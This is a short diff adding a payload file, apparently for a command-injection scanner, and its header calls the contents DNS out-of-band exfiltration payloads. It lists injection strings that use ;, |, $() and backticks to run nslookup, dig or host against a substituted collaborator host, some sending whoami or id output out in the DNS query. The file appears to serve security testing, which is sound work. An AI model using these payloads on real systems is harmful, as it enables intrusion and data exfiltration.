@@ -1,0 +1,20 @@
+# @default_os:     linux
+# @default_signal: oob
+# @default_blind:  false
+# @default_tier:   4
+#
+# DNS OOB exfiltration payloads.
+# Loaded when --collab is set. COLLAB_HOST is substituted at runtime.
+
+; nslookup COLLAB_HOST
+| nslookup COLLAB_HOST
+; nslookup `whoami`.COLLAB_HOST
+| nslookup `id`.COLLAB_HOST
+$(nslookup COLLAB_HOST)
+`nslookup COLLAB_HOST`
+
+# @label: dig OOB
+; dig COLLAB_HOST
+
+# @label: host OOB
+; host COLLAB_HOST
